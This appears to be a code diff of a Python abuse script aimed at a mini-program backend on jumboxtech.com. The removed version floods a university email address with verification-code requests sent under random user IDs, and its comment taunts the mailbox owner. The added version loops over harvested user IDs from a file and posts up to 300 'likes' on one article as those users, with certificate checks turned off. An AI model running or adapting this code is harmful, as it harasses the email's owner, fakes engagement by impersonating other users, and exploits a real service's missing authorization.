@@ -1,18 +1,23 @@
 '''
-F88K that edu mailbox.
+NOT APPLICABLE
 
-Send the email with RANDOM userId, you can choose anyone that has
+If userId DNE the operation will fail
 '''
 
+
 import json
+import threading
+import time
+
+import requests
 import string
 import random
-import requests
 
-email = 'XXX@wku.edu.cn'
+articleId = 'XXX'
+limit = 300
 
 requests.packages.urllib3.disable_warnings()
-base_url = "https://www.jumboxtech.com:8022/user/getCode"
+base_url = "https://www.jumboxtech.com:8022/social/userLike"
 header = {
     'Host': 'www.jumboxtech.com:8022',
     'Connection': 'keep-alive',
@@ -24,17 +29,16 @@ header = {
     'Referer': 'https://servicewechat.com/wxf7f31446cd68367a/5/page-frame.html',
 }
 
-def random_string_generator(str_size, allowed_chars):
-    return ''.join(random.choice(allowed_chars) for x in range(str_size))
-
-chars = string.ascii_uppercase + string.digits * 3
-size = 32
-
-random_user_id = random_string_generator(size, allowed_chars=chars)
-
-s = requests.session()
-s.keep_alive = False
-payload = f'userId={random_user_id}&email={email}'
-req = s.post(base_url, headers=header, data=payload, verify=False)
-print(req.content.decode(encoding='utf-8'))
-ob = json.loads(req.content.decode(encoding='utf-8'))
+with open('ids.txt', 'r', encoding='utf-8') as f:
+    for line in f:
+        line = line.replace('\n', '').split(',')[0]
+        limit -= 1
+        s = requests.session()
+        s.keep_alive = False
+        payload = f'userId={line}&targetType=ARTICLE&ActionType=1&targetId={articleId}'
+        print(payload)
+        req = s.post(base_url, headers=header, data=payload, verify=False)
+        ob = json.loads(req.content.decode(encoding='utf-8'))
+        print(req.content.decode(encoding='utf-8'))
+        if limit == 0:
+            break
